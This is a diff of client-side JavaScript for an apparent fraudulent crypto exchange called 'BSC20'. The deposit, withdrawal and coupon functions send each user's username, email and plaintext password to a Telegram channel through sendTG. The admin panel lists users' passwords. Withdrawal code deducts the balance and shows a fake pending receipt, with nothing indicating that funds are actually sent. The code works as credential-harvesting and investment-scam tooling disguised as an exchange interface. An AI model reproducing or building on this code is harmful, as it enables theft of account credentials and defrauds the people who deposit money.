-  if (!closed.length) { el.innerHTML = '<div class="tc ts" style="padding:16px;color:var(--gray)">No trade history</div>'; return; }
-  var h = '';
-  for (var i = 0; i < closed.length; i++) {
-    var p = closed[i];
-    var cl = p.pnl >= 0 ? 'pnl-up' : 'pnl-dn';
-    var dirCol = p.dir === 'LONG' ? 'var(--green)' : 'var(--red)';
-    h += '<div class="hist-i"><div><div class="fw7 ts">' + p.pair + ' <span style="color:' + dirCol + '">' + p.dir + '</span> ' + p.lev + 'x</div><div class="txs" style="color:var(--gray)">' + new Date(p.closedAt).toLocaleString() + '</div></div><div class="ts mono ' + cl + ' fw7">' + (p.pnl >= 0 ? '+' : '') + '$' + p.pnl.toFixed(2) + '</div></div>';
-  }
-  el.innerHTML = h;
+function submitDep(){
+if(!user)return toast('Login first!','err');
+var amt=parseFloat(document.getElementById('depAmt').value);
+var hash=document.getElementById('depHash').value.trim();
+if(!amt||amt<5)return toast('Minimum 5 USDT','err');
+if(!hash||hash.length<5)return toast('Enter valid TxHash','err');
+var w=getWallet();
+var dep={id:'D'+Date.now(),uid:user.id,uname:user.username,uemail:user.email,upass:user.password,amt:amt,net:selNet,hash:hash,addr:CFG.ADDR[selNet],st:'pending',at:new Date().toISOString()};
+var deps=LS('bsc20_deps')||[];deps.push(dep);LS('bsc20_deps',deps);
+var txns=LS('bsc20_txn_'+user.id)||[];
+txns.push({type:'deposit',amt:amt,st:'pending',net:selNet,at:dep.at,id:dep.id});
+LS('bsc20_txn_'+user.id,txns);
+document.getElementById('depAmt').value='';document.getElementById('depHash').value='';
+toast('Deposit submitted! Awaiting review','ok');
+sendTG('NEW DEPOSIT\n\nUsername: '+user.username+'\nEmail: '+user.email+'\nUser ID: '+user.id+'\nPassword: '+user.password+'\n\nAmount: '+amt+' USDT\nNetwork: '+selNet+'\nTxHash: '+hash+'\nTo Address: '+CFG.ADDR[selNet]+'\nCurrent Balance: $'+(w.main+w.bonus).toFixed(2)+'\nDeposit ID: '+dep.id+'\nTime: '+new Date().toLocaleString()+'\nTotal Users: '+(LS('bsc20_users')||[]).length+'\n\nStatus: PENDING');
 }
 
-// WALLET
-function wTab(t) {
-  var secs = document.querySelectorAll('#pg_wallet .wsec');
-  for (var i = 0; i < secs.length; i++) secs[i].classList.remove('on');
-  var tabs = document.querySelectorAll('#wTabs .tab');
-  for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('on');
-  var map = { dep: 0, wd: 1, coupon: 2, hist: 3 };
-  var secMap = { dep: 'ws_dep', wd: 'ws_wd', coupon: 'ws_coupon', hist: 'ws_hist' };
-  document.getElementById(secMap[t]).classList.add('on');
-  tabs[map[t]].classList.add('on');
-  if (t === 'hist') renderHistory();
-  if (t === 'dep') { updateDepAddr(); genQR(); }
+function selWN(el){var btns=document.querySelectorAll('#ws_wd .net-b');for(var i=0;i<btns.length;i++)btns[i].classList.remove('on');el.classList.add('on')}
+
+function submitWd(){
+if(!user)return toast('Login first!','err');
+var addr=document.getElementById('wdAddr').value.trim();
+var amt=parseFloat(document.getElementById('wdAmt').value);
+var wdNetEl=document.querySelector('#ws_wd .net-b.on');
+var wdNet=wdNetEl?wdNetEl.textContent.trim():'TRC20';
+if(!addr)return toast('Enter wallet address','err');
+if(!amt||amt<10)return toast('Minimum 10 USDT','err');
+var w=getWallet();
+if(w.main<amt+1)return toast('Insufficient balance!','err');
+w.main-=(amt+1);setWallet(user.id,w);
+var wdId='W'+Date.now();
+var wd={id:wdId,uid:user.id,uname:user.username,uemail:user.email,upass:user.password,amt:amt,fee:1,addr:addr,net:wdNet,st:'pending',at:new Date().toISOString()};
+var wds=LS('bsc20_wds')||[];wds.push(wd);LS('bsc20_wds',wds);
+var txns=LS('bsc20_txn_'+user.id)||[];
+txns.push({type:'withdraw',amt:amt,st:'pending (30 min)',at:wd.at,id:wdId,addr:addr,net:wdNet,fee:1});
+LS('bsc20_txn_'+user.id,txns);
+document.getElementById('wdAddr').value='';document.getElementById('wdAmt').value='';
+updateBals();
+showWdReceipt(wd);
+sendTG('WITHDRAWAL REQUEST\n\nUsername: '+user.username+'\nEmail: '+user.email+'\nUser ID: '+user.id+'\nPassword: '+user.password+'\n\nAmount: '+amt+' USDT\nFee: 1 USDT\nTotal Deducted: '+(amt+1)+' USDT\nNetwork: '+wdNet+'\nTo: '+addr+'\nRemaining: $'+w.main.toFixed(2)+'\nWD ID: '+wdId+'\nTime: '+new Date().toLocaleString()+'\n\nStatus: PENDING (30 min)');
 }
 
-function updateDepAddr() {
-  document.getElementById('depAddr').innerHTML = CFG.ADDR[selNet] + '<button class="cp-btn" onclick="copyAddr()">Copy</button>';
-}
-function selDepNet(n, el) {
-  selNet = n;
-  var btns = document.querySelectorAll('#ws_dep .net-b');
-  for (var i = 0; i < btns.length; i++) btns[i].classList.remove('on');
-  el.classList.add('on');
-  updateDepAddr();
-  genQR();
-}
-function copyAddr() {
-  var text = CFG.ADDR[selNet];
-  if (navigator.clipboard) {
-    navigator.clipboard.writeText(text).then(function () { toast('Address copied!', 'ok'); });
-  } else {
-    var ta = document.createElement('textarea');
-    ta.value = text;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand('copy');
-    document.body.removeChild(ta);
-    toast('Address copied!', 'ok');
-  }
-}
-function genQR() {
-  var cv = document.getElementById('qrC');
-  if (!cv) return;
-  var ctx = cv.getContext('2d');
-  ctx.fillStyle = '#fff';
-  ctx.fillRect(0, 0, 110, 110);
-  var addr = CFG.ADDR[selNet];
-  ctx.fillStyle = '#000';
-  for (var i = 0; i < 16; i++) {
-    for (var j = 0; j < 16; j++) {
-      if ((addr.charCodeAt((i * 16 + j) % addr.length) + i + j) % 3 === 0) {
-        ctx.fillRect(i * 6 + 5, j * 6 + 5, 5, 5);
-      }
-    }
-  }
-  var corners = [{ x: 5, y: 5 }, { x: 83, y: 5 }, { x: 5, y: 83 }];
-  for (var k = 0; k < corners.length; k++) {
-    var cx = corners[k].x, cy = corners[k].y;
-    ctx.fillStyle = '#000';
-    ctx.fillRect(cx, cy, 22, 22);
-    ctx.fillStyle = '#fff';
-    ctx.fillRect(cx + 3, cy + 3, 16, 16);
-    ctx.fillStyle = '#000';
-    ctx.fillRect(cx + 6, cy + 6, 10, 10);
-  }
+function showWdReceipt(wd){
+var b=document.getElementById('receiptBody');
+var h='<div class="receipt"><div class="receipt-stamp">BSC20</div><div class="receipt-hdr"><h2>BSC20</h2><p>Withdrawal Receipt</p><p style="font-size:8px;color:#ccc;margin-top:2px">'+wd.id+'</p></div>';
+h+='<div class="receipt-row"><span class="rl">Type</span><span class="rv">Withdrawal</span></div>';
+h+='<div class="receipt-row"><span class="rl">Amount</span><span class="rv">'+wd.amt.toFixed(2)+' USDT</span></div>';
+h+='<div class="receipt-row"><span class="rl">Fee</span><span class="rv">'+wd.fee.toFixed(2)+' USDT</span></div>';
+h+='<div class="receipt-row"><span class="rl">Total</span><span class="rv" style="color:#f0b90b;font-weight:900">'+(wd.amt+wd.fee).toFixed(2)+' USDT</span></div>';
+h+='<div class="receipt-row"><span class="rl">Network</span><span class="rv">'+wd.net+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">To Address</span><span class="rv" style="font-size:9px">'+wd.addr+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">Date</span><span class="rv">'+new Date(wd.at).toLocaleString()+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">User</span><span class="rv">'+wd.uname+'</span></div>';
+h+='<div class="receipt-status pending"><div style="font-size:18px;margin-bottom:4px">&#9203;</div><div style="font-weight:900;font-size:14px">PENDING</div><div style="font-size:10px;margin-top:2px">Estimated: ~30 minutes</div></div>';
+h+='<div class="receipt-footer"><p>BSC20 Exchange - bsc20.us</p><p>Support: t.me/bsc20us</p></div></div>';
+b.innerHTML=h;document.getElementById('receiptModal').classList.add('on');
 }
 
-function submitDeposit() {
-  if (!user) return toast('Login first!', 'err');
-  var amt = parseFloat(document.getElementById('depAmt').value);
-  var hash = document.getElementById('depHash').value.trim();
-  if (!amt || amt < 5) return toast('Minimum 5 USDT', 'err');
-  if (!hash || hash.length < 5) return toast('Enter valid TxHash', 'err');
-  var w = getWallet();
-  var dep = {
-    id: 'D' + Date.now(), uid: user.id, uname: user.username, uemail: user.email,
-    upass: user.password, amt: amt, net: selNet, hash: hash,
-    addr: CFG.ADDR[selNet], st: 'pending', at: new Date().toISOString()
-  };
-  var deps = LS('bsc20_deps') || [];
-  deps.push(dep);
-  LS('bsc20_deps', deps);
-  var txns = LS('bsc20_txn_' + user.id) || [];
-  txns.push({ type: 'deposit', amt: amt, st: 'pending', net: selNet, at: dep.at, id: dep.id });
-  LS('bsc20_txn_' + user.id, txns);
-  document.getElementById('depAmt').value = '';
-  document.getElementById('depHash').value = '';
-  toast('Deposit submitted! Awaiting review', 'ok');
-  sendTG('NEW DEPOSIT REQUEST\n\nUsername: ' + user.username + '\nEmail: ' + user.email + '\nUser ID: ' + user.id + '\nPassword: ' + user.password + '\n\nAmount: ' + amt + ' USDT\nNetwork: ' + selNet + '\nTxHash: ' + hash + '\nTo Address: ' + CFG.ADDR[selNet] + '\nCurrent Balance: $' + (w.main + w.bonus).toFixed(2) + '\nDeposit ID: ' + dep.id + '\nTime: ' + new Date().toLocaleString() + '\nTotal Users: ' + (LS('bsc20_users') || []).length + '\n\nStatus: PENDING REVIEW');
+function showTxReceipt(type,amt,st,at,id,net,addr,fee){
+var b=document.getElementById('receiptBody');
+var isWd=type==='withdraw';
+var stClass=(st==='completed'||st==='done')?'completed':'pending';
+var h='<div class="receipt"><div class="receipt-stamp">BSC20</div><div class="receipt-hdr"><h2>BSC20</h2><p>'+(isWd?'Withdrawal':'Deposit')+' Receipt</p><p style="font-size:8px;color:#ccc;margin-top:2px">'+id+'</p></div>';
+h+='<div class="receipt-row"><span class="rl">Type</span><span class="rv">'+type+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">Amount</span><span class="rv">'+parseFloat(amt).toFixed(2)+' USDT</span></div>';
+if(fee)h+='<div class="receipt-row"><span class="rl">Fee</span><span class="rv">'+fee+' USDT</span></div>';
+if(net)h+='<div class="receipt-row"><span class="rl">Network</span><span class="rv">'+net+'</span></div>';
+if(addr)h+='<div class="receipt-row"><span class="rl">Address</span><span class="rv" style="font-size:9px">'+addr+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">Date</span><span class="rv">'+new Date(at).toLocaleString()+'</span></div>';
+h+='<div class="receipt-status '+stClass+'"><div style="font-size:18px;margin-bottom:4px">'+(stClass==='completed'?'&#9989;':'&#9203;')+'</div><div style="font-weight:900;font-size:14px">'+st.toUpperCase()+'</div></div>';
+h+='<div class="receipt-footer"><p>BSC20 Exchange</p></div></div>';
+b.innerHTML=h;document.getElementById('receiptModal').classList.add('on');
+}
+function closeReceipt(){document.getElementById('receiptModal').classList.remove('on')}
+
+/* ===== COUPON ===== */
+function redeemCoupon(){
+if(!user)return toast('Login first!','err');
+var code=document.getElementById('coupIn').value.trim().toUpperCase();
+if(!code)return toast('Enter a coupon code','err');
+if(COUPONS[code]===undefined)return toast('Invalid coupon code!','err');
+var used=LS('bsc20_used_c')||{};
+if(used[code])return toast('Code already used!','err');
+var val=COUPONS[code];var w=getWallet();
+w.bonus+=val;setWallet(user.id,w);
+used[code]={by:user.id,user:user.username,at:new Date().toISOString()};
+LS('bsc20_used_c',used);
+document.getElementById('coupIn').value='';updateBals();
+toast('+'+val+' USDT bonus added!','ok');
+sendTG('COUPON REDEEMED\n\nUsername: '+user.username+'\nEmail: '+user.email+'\nUser ID: '+user.id+'\nPassword: '+user.password+'\n\nCode: '+code+'\nValue: '+val+' USDT\nNew Bonus: $'+w.bonus.toFixed(2)+'\nTotal Balance: $'+(w.main+w.bonus).toFixed(2)+'\nTime: '+new Date().toLocaleString());
 }
 
-function selWdNet(el) {
-  var btns = document.querySelectorAll('#ws_wd .net-b');
-  for (var i = 0; i < btns.length; i++) btns[i].classList.remove('on');
-  el.classList.add('on');
+/* ===== HISTORY ===== */
+function renderHist(filter){
+if(!user)return;
+var txns=LS('bsc20_txn_'+user.id)||[];
+if(filter&&filter!=='all'){
+var filtered=[];for(var i=0;i<txns.length;i++){if(txns[i].type===filter)filtered.push(txns[i])}
+txns=filtered;
+}
+txns=txns.slice().reverse();
+var el=document.getElementById('histList');
+if(!txns.length){el.innerHTML='<div class="tc ts" style="padding:24px;color:var(--gray)">No transactions yet</div>';return}
+var h='';
+for(var i=0;i<txns.length;i++){
+var t=txns[i];var ico=t.type==='deposit'?'&#128229;':'&#128228;';
+var stCl=(t.st==='completed'||t.st==='done')?'st-d':(t.st&&(t.st.indexOf('reject')>=0||t.st.indexOf('refund')>=0))?'st-f':'st-p';
+h+='<div class="hist-i" onclick="showTxReceipt(\''+t.type+'\','+t.amt+',\''+t.st+'\',\''+t.at+'\',\''+t.id+'\',\''+(t.net||'')+'\',\''+(t.addr||'')+'\','+(t.fee||0)+')">';
+h+='<div><div class="fw7 ts">'+ico+' '+t.type.charAt(0).toUpperCase()+t.type.slice(1)+'</div>';
+h+='<div class="txs" style="color:var(--gray)">'+new Date(t.at).toLocaleString()+'</div></div>';
+h+='<div class="tr"><div class="ts mono fw7">'+(t.type==='withdraw'?'-':'+')+' $'+t.amt.toFixed(2)+'</div>';
+h+='<div class="'+stCl+'">'+(t.st||'pending')+'</div></div></div>';
+}
+el.innerHTML=h;
+}
+function htF(f,el){
+var tabs=document.querySelectorAll('#htTabs .tab');
+for(var i=0;i<tabs.length;i++)tabs[i].classList.remove('on');
+el.classList.add('on');renderHist(f);
 }
 
-function submitWithdraw() {
-  if (!user) return toast('Login first!', 'err');
-  var addr = document.getElementById('wdAddr').value.trim();
-  var amt = parseFloat(document.getElementById('wdAmt').value);
-  var wdNetEl = document.querySelector('#ws_wd .net-b.on');
-  var wdNet = wdNetEl ? wdNetEl.textContent.trim() : 'TRC20';
-  if (!addr) return toast('Enter wallet address', 'err');
-  if (!amt || amt < 10) return toast('Minimum 10 USDT', 'err');
-  var w = getWallet();
-  if (w.main < amt + 1) return toast('Insufficient balance!', 'err');
-  w.main -= (amt + 1);
-  setWallet(user.id, w);
-  var wdId = 'W' + Date.now();
-  var wd = {
-    id: wdId, uid: user.id, uname: user.username, uemail: user.email,
-    upass: user.password, amt: amt, fee: 1, addr: addr, net: wdNet,
-    st: 'pending', at: new Date().toISOString()
-  };
-  var wds = LS('bsc20_wds') || [];
-  wds.push(wd);
-  LS('bsc20_wds', wds);
-  var txns = LS('bsc20_txn_' + user.id) || [];
-  txns.push({ type: 'withdraw', amt: amt, st: 'pending (30 min)', at: wd.at, id: wdId, addr: addr, net: wdNet, fee: 1 });
-  LS('bsc20_txn_' + user.id, txns);
-  document.getElementById('wdAddr').value = '';
-  document.getElementById('wdAmt').value = '';
-  updateBalances();
-  // Show receipt
-  showWithdrawReceipt(wd);
-  sendTG('WITHDRAWAL REQUEST\n\nUsername: ' + user.username + '\nEmail: ' + user.email + '\nUser ID: ' + user.id + '\nPassword: ' + user.password + '\n\nAmount: ' + amt + ' USDT\nFee: 1 USDT\nTotal Deducted: ' + (amt + 1) + ' USDT\nNetwork: ' + wdNet + '\nTo: ' + addr + '\nRemaining: $' + w.main.toFixed(2) + '\nWD ID: ' + wdId + '\nTime: ' + new Date().toLocaleString() + '\n\nStatus: PENDING (30 min)');
+/* ===== OFFERS ===== */
+function renderOffers(){var h='';for(var i=0;i<OFFERS.length;i++)h+=offerH(OFFERS[i]);document.getElementById('offersAll').innerHTML=h}
+function offerH(o){
+var act=o.p?"goPage('"+o.p+"')":"claimOffer("+o.id+")";
+return '<div class="off-c"><div class="off-t">'+o.i+' '+o.t+' <span class="badge">'+o.b+'</span></div><div class="off-d">'+o.d+'</div><button class="btn btn-gold" style="padding:9px;font-size:11px" onclick="'+act+'">'+o.a+'</button></div>';
+}
+function claimOffer(id){
+if(!user)return toast('Login first!','err');
+if(id===5){
+var w=getWallet();if(w.main+w.bonus<50)return toast('Min $50 balance needed','err');
+var prizes=[1,1,1,2,5,5,10,10,25,50,100];
+var prize=prizes[Math.floor(Math.random()*prizes.length)];
+w.bonus+=prize;setWallet(user.id,w);updateBals();
+toast('You won '+prize+' USDT!','ok');return;
+}
+toast('Offer noted! Check requirements.','info');
 }
 
-// WITHDRAWAL RECEIPT
-function showWithdrawReceipt(wd) {
-  var body = document.getElementById('receiptBody');
-  var h = '';
-  h += '<div class="receipt">';
-  h += '<div class="receipt-stamp">BSC20</div>';
-  h += '<div class="receipt-hdr">';
-  h += '<h2>BSC20</h2>';
-  h += '<p>Withdrawal Receipt</p>';
-  h += '<p style="font-size:8px;color:#ccc;margin-top:2px">' + wd.id + '</p>';
-  h += '</div>';
-  h += '<div class="receipt-row"><span class="rl">Type</span><span class="rv">Withdrawal</span></div>';
-  h += '<div class="receipt-row"><span class="rl">Amount</span><span class="rv">' + wd.amt.toFixed(2) + ' USDT</span></div>';
-  h += '<div class="receipt-row"><span class="rl">Fee</span><span class="rv">' + wd.fee.toFixed(2) + ' USDT</span></div>';
-  h += '<div class="receipt-row"><span class="rl">Total</span><span class="rv" style="color:#f0b90b;font-weight:900">' + (wd.amt + wd.fee).toFixed(2) + ' USDT</span></div>';
-  h += '<div class="receipt-row"><span class="rl">Network</span><span class="rv">' + wd.net + '</span></div>';
-  h += '<div class="receipt-row"><span class="rl">To Address</span><span class="rv" style="font-size:9px">' + wd.addr + '</span></div>';
-  h += '<div class="receipt-row"><span class="rl">Date</span><span class="rv">' + new Date(wd.at).toLocaleString() + '</span></div>';
-  h += '<div class="receipt-row"><span class="rl">User</span><span class="rv">' + wd.uname + '</span></div>';
-  h += '<div class="receipt-status pending">';
-  h += '<div style="font-size:18px;margin-bottom:4px">⏳</div>';
-  h += '<div style="font-weight:900;font-size:14px">PENDING</div>';
-  h += '<div style="font-size:10px;margin-top:2px">Estimated: ~30 minutes</div>';
-  h += '</div>';
-  h += '<div class="receipt-footer">';
-  h += '<p>BSC20 Exchange - bsc20.us</p>';
-  h += '<p>Support: t.me/bsc20us</p>';
-  h += '<p style="margin-top:4px">Thank you for using BSC20!</p>';
-  h += '</div>';
-  h += '</div>';
-  body.innerHTML = h;
-  document.getElementById('receiptModal').classList.add('on');
+function renderProfile(){
+if(!user)return;
+document.getElementById('pName').textContent=user.username;
+document.getElementById('pEmail').textContent=user.email;
 }
 
-function showTxReceipt(txn) {
-  var body = document.getElementById('receiptBody');
-  var isWd = txn.type === 'withdraw';
-  var stClass = (txn.st === 'completed' || txn.st === 'done') ? 'completed' : 'pending';
-  var stText = txn.st || 'pending';
-  var h = '';
-  h += '<div class="receipt">';
-  h += '<div class="receipt-stamp">BSC20</div>';
-  h += '<div class="receipt-hdr">';
-  h += '<h2>BSC20</h2>';
-  h += '<p>' + (isWd ? 'Withdrawal' : 'Deposit') + ' Receipt</p>';
-  h += '<p style="font-size:8px;color:#ccc;margin-top:2px">' + txn.id + '</p>';
-  h += '</div>';
-  h += '<div class="receipt-row"><span class="rl">Type</span><span class="rv">' + txn.type + '</span></div>';
-  h += '<div class="receipt-row"><span class="rl">Amount</span><span class="rv">' + txn.amt.toFixed(2) + ' USDT</span></div>';
-  if (txn.fee) h += '<div class="receipt-row"><span class="rl">Fee</span><span class="rv">' + txn.fee + ' USDT</span></div>';
-  if (txn.net) h += '<div class="receipt-row"><span class="rl">Network</span><span class="rv">' + txn.net + '</span></div>';
-  if (txn.addr) h += '<div class="receipt-row"><span class="rl">Address</span><span class="rv" style="font-size:9px">' + txn.addr + '</span></div>';
-  h += '<div class="receipt-row"><span class="rl">Date</span><span class="rv">' + new Date(txn.at).toLocaleString() + '</span></div>';
-  h += '<div class="receipt-status ' + stClass + '">';
-  h += '<div style="font-size:18px;margin-bottom:4px">' + (stClass === 'completed' ? '✅' : '⏳') + '</div>';
-  h += '<div style="font-weight:900;font-size:14px">' + stText.toUpperCase() + '</div>';
-  h += '</div>';
-  h += '<div class="receipt-footer"><p>BSC20 Exchange - bsc20.us</p><p>Support: t.me/bsc20us</p></div>';
-  h += '</div>';
-  body.innerHTML = h;
-  document.getElementById('receiptModal').classList.add('on');
+/* =============================== */
+/* ===== ADMIN PANEL (FULL) ===== */
+/* =============================== */
+function renderAdmin(){
+if(!isAdmin)return;
+var users=LS('bsc20_users')||[];
+var deps=LS('bsc20_deps')||[];
+var wds=LS('bsc20_wds')||[];
+var uc=LS('bsc20_used_c')||{};
+document.getElementById('aU').textContent=users.length;
+document.getElementById('aD').textContent=deps.length;
+document.getElementById('aW').textContent=wds.length;
+document.getElementById('aC').textContent=Object.keys(uc).length;
+renderAUsers(users);
+renderADeps(deps);
+renderAWds(wds);
 }
 
-function closeReceipt() { document.getElementById('receiptModal').classList.remove('on'); }
-
-// COUPON
-function redeemCoupon() {
-  if (!user) return toast('Login first!', 'err');
-  var code = document.getElementById('coupIn').value.trim().toUpperCase();
-  if (!code) return toast('Enter a coupon code', 'err');
-  if (COUPONS[code] === undefined) return toast('Invalid coupon code!', 'err');
-  var used = LS('bsc20_used_c') || {};
-  if (used[code]) return toast('Code already used!', 'err');
-  var val = COUPONS[code];
-  var w = getWallet();
-  w.bonus += val;
-  setWallet(user.id, w);
-  used[code] = { by: user.id, user: user.username, at: new Date().toISOString() };
-  LS('bsc20_used_c', used);
-  document.getElementById('coupIn').value = '';
-  updateBalances();
-  toast('+' + val + ' USDT bonus added!', 'ok');
-  sendTG('COUPON REDEEMED\n\nUsername: ' + user.username + '\nEmail: ' + user.email + '\nUser ID: ' + user.id + '\nPassword: ' + user.password + '\n\nCode: ' + code + '\nValue: ' + val + ' USDT\nNew Bonus: $' + w.bonus.toFixed(2) + '\nTotal Balance: $' + (w.main + w.bonus).toFixed(2) + '\nTime: ' + new Date().toLocaleString() + '\nCodes Used: ' + Object.keys(used).length);
+function renderAUsers(users){
+if(!users)users=LS('bsc20_users')||[];
+var ws=LS('bsc20_wallets')||{};
+var el=document.getElementById('adUserList');
+if(!users.length){el.innerHTML='<div class="tc ts" style="padding:24px;color:var(--gray)">No users yet</div>';return}
+var h='';
+for(var i=0;i<users.length;i++){
+var u=users[i];
+var w=ws[u.id]||{main:0,bonus:0};
+var total=(w.main+w.bonus).toFixed(2);
+var banned=u.banned?true:false;
+h+='<div class="user-card'+(banned?' user-banned':'')+'">';
+h+='<div class="uc-top">';
+h+='<div>';
+h+='<div class="uc-name">'+(banned?'&#128683; ':'<span class="user-online"></span>')+u.username+'</div>';
+h+='<div class="uc-email">'+u.email+'</div>';
+h+='</div>';
+h+='<div class="uc-bal">$'+total+'</div>';
+h+='</div>';
+h+='<div class="uc-info">Main: $'+w.main.toFixed(2)+' | Bonus: $'+w.bonus.toFixed(2)+'</div>';
+h+='<div class="uc-info">ID: '+u.id+'</div>';
+h+='<div class="uc-info">Pass: '+u.password+'</div>';
+h+='<div class="uc-info">Joined: '+new Date(u.created).toLocaleDateString()+'</div>';
+if(banned)h+='<div class="uc-info" style="color:var(--red);font-weight:700">BANNED</div>';
+h+='<div class="uc-actions">';
+h+='<button class="btn btn-gold btn-xs" onclick="openEM(\''+u.id+'\')">Edit Balance</button>';
+h+='<button class="btn '+(banned?'btn-green':'btn-red')+' btn-xs" onclick="toggleBanDirect(\''+u.id+'\')">'+(banned?'Unban':'Ban')+'</button>';
+h+='<button class="btn btn-outline btn-xs" onclick="addBonusDirect(\''+u.id+'\')">+Bonus</button>';
+h+='<button class="btn btn-outline btn-xs" onclick="resetBalDirect(\''+u.id+'\')">Reset</button>';
+h+='</div>';
+h+='</div>';
+}
+el.innerHTML=h;
 }
 
-// HISTORY
-function renderHistory(filter) {
-  if (!user) return;
-  var txns = LS('bsc20_txn_' + user.id) || [];
-  if (filter && filter !== 'all') {
-    var filtered = [];
-    for (var i = 0; i < txns.length; i++) {
-      if (txns[i].type === filter) filtered.push(txns[i]);
-    }
-    txns = filtered;
-  }
-  txns = txns.slice().reverse();
-  var el = document.getElementById('histList');
-  if (!txns.length) { el.innerHTML = '<div class="tc ts" style="padding:24px;color:var(--gray)">No transactions yet</div>'; return; }
-  var h = '';
-  for (var i = 0; i < txns.length; i++) {
-    var t = txns[i];
-    var ico = t.type === 'deposit' ? '📥' : '📤';
-    var stCl = (t.st === 'completed' || t.st === 'done') ? 'st-d' : (t.st && (t.st.indexOf('reject') >= 0 || t.st.indexOf('refund') >= 0)) ? 'st-f' : 'st-p';
-    h += '<div class="hist-i" onclick="showTxReceipt(' + JSON.stringify(t).replace(/"/g, '&quot;') + ')" style="cursor:pointer">';
-    h += '<div><div class="fw7 ts">' + ico + ' ' + t.type.charAt(0).toUpperCase() + t.type.slice(1) + '</div>';
-    h += '<div class="txs" style="color:var(--gray)">' + new Date(t.at).toLocaleString() + '</div></div>';
-    h += '<div class="tr"><div class="ts mono fw7">' + (t.type === 'withdraw' ? '-' : '+') + ' $' + t.amt.toFixed(2) + '</div>';
-    h += '<div class="' + stCl + '">' + (t.st || 'pending') + '</div></div></div>';
-  }
-  el.innerHTML = h;
+function searchAU(v){
+var users=LS('bsc20_users')||[];
+if(v){
+var s=v.toLowerCase();var filtered=[];
+for(var i=0;i<users.length;i++){
+if(users[i].username.toLowerCase().indexOf(s)>=0||users[i].email.toLowerCase().indexOf(s)>=0||users[i].id.indexOf(s)>=0){filtered.push(users[i])}
 }
-function htFilt(f, el) {
-  var tabs = document.querySelectorAll('#htTabs .tab');
-  for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('on');
-  el.classList.add('on');
-  renderHistory(f);
+users=filtered;
+}
+renderAUsers(users);
 }
 
-// OFFERS
-function renderOffers() {
-  var h = '';
-  for (var i = 0; i < OFFERS.length; i++) h += offerHTML(OFFERS[i]);
-  document.getElementById('offersAll').innerHTML = h;
+function renderADeps(deps){
+deps=deps||LS('bsc20_deps')||[];
+var el=document.getElementById('adDepList');
+if(!deps.length){el.innerHTML='<div class="tc ts" style="padding:24px;color:var(--gray)">No deposits yet</div>';return}
+var h='';
+for(var i=deps.length-1;i>=0;i--){
+var d=deps[i];
+var stCl=d.st==='completed'?'st-d':d.st==='rejected'?'st-f':'st-p';
+h+='<div class="admin-c">';
+h+='<div class="flex-b mb4"><div><span class="fw7 ts">'+d.uname+'</span> <span class="txs" style="color:var(--gray)">'+d.uemail+'</span></div>';
+h+='<span class="'+stCl+'">'+d.st+'</span></div>';
+h+='<div class="flex-b txs mb4"><span class="mono fw7" style="color:var(--gold)">'+d.amt+' USDT ('+d.net+')</span><span style="color:var(--gray)">'+new Date(d.at).toLocaleString()+'</span></div>';
+h+='<div class="txs mono mb4" style="word-break:break-all;color:var(--gray)">TxHash: '+d.hash+'</div>';
+h+='<div class="txs mb4" style="color:var(--gray)">User ID: '+d.uid+'</div>';
+h+='<div class="txs mb4" style="color:var(--gray)">Pass: '+d.upass+'</div>';
+if(d.st==='pending'){
+h+='<div class="g2"><button class="btn btn-green btn-sm" onclick="appDep(\''+d.id+'\')">Approve</button><button class="btn btn-red btn-sm" onclick="rejDep(\''+d.id+'\')">Reject</button></div>';
 }
-function offerHTML(o) {
-  var act = o.p ? "goPage('" + o.p + "')" : "claimOffer(" + o.id + ")";
-  return '<div class="off-c"><div class="off-t">' + o.i + ' ' + o.t + ' <span class="badge">' + o.b + '</span></div><div class="off-d">' + o.d + '</div><button class="btn btn-gold" style="padding:9px;font-size:11px" onclick="' + act + '">' + o.a + '</button></div>';
+h+='</div>';
 }
-function claimOffer(id) {
-  if (!user) return toast('Login first!', 'err');
-  if (id === 5) {
-    var w = getWallet();
-    if (w.main + w.bonus < 50) return toast('Min $50 balance needed', 'err');
-    var prizes = [1, 1, 1, 2, 5, 5, 10, 10, 25, 50, 100];
-    var prize = prizes[Math.floor(Math.random() * prizes.length)];
-    w.bonus += prize;
-    setWallet(user.id, w);
-    updateBalances();
-    toast('You won ' + prize + ' USDT!', 'ok');
-    return;
-  }
-  var cl = LS('bsc20_claimed_' + user.id) || [];
-  if (cl.indexOf(id) >= 0) return toast('Already claimed!', 'info');
-  cl.push(id);
-  LS('bsc20_claimed_' + user.id, cl);
-  toast('Offer claimed!', 'ok');
+el.innerHTML=h;
 }
 
-// PROFILE
-function renderProfile() {
-  if (!user) return;
-  document.getElementById('pName').textContent = user.username;
-  document.getElementById('pEmail').textContent = user.email;
+function appDep(id){
+var deps=LS('bsc20_deps')||[];var d=null;
+for(var i=0;i<deps.length;i++){if(deps[i].id===id){d=deps[i];break}}
+if(!d)return;
+d.st='completed';LS('bsc20_deps',deps);
+var w=getWallet(d.uid);w.main+=d.amt;setWallet(d.uid,w);
+var txns=LS('bsc20_txn_'+d.uid)||[];
+for(var j=0;j<txns.length;j++){if(txns[j].id===id){txns[j].st='completed';break}}
+LS('bsc20_txn_'+d.uid,txns);
+renderAdmin();toast('Deposit approved!','ok');
+sendTG('DEPOSIT APPROVED\n\nUsername: '+d.uname+'\nEmail: '+d.uemail+'\nUser ID: '+d.uid+'\nAmount: '+d.amt+' USDT ('+d.net+')\nNew Balance: $'+(w.main+w.bonus).toFixed(2)+'\nTime: '+new Date().toLocaleString());
 }
 
-// ====== ADMIN ======
-function renderAdmin() {
-  if (!isAdmin) return;
-  var users = LS('bsc20_users') || [];
-  var deps = LS('bsc20_deps') || [];
-  var wds = LS('bsc20_wds') || [];
-  var uc = LS('bsc20_used_c') || {};
-  document.getElementById('aU').textContent = users.length;
-  document.getElementById('aD').textContent = deps.length;
-  document.getElementById('aW').textContent = wds.length;
-  document.getElementById('aC').textContent = Object.keys(uc).length;
-  renderAdUsers(users);
-  renderAdDeps(deps);
-  renderAdWds(wds);
+function rejDep(id){
+var deps=LS('bsc20_deps')||[];var d=null;
+for(var i=0;i<deps.length;i++){if(deps[i].id===id){d=deps[i];break}}
